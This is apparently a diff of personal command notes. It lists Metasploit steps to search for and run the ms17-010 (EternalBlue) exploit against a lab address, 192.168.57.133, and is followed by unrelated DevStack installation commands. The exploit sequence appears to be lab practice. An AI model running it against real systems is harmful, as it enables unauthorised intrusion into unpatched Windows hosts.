@@ -1,3 +1,4 @@
+msfconsole
 snap install metasploit-framework
 search ms17-010
 use 1
@@ -12,6 +13,7 @@ set RHOSTS 192.168.57.133
 set LHOSTS 192.168.57.132
 run
 help
+
 sudo apt update && sudo apt upgrade -y
 sudo apt install git -y
 git clone https://opendev.org/openstack/devstack.git
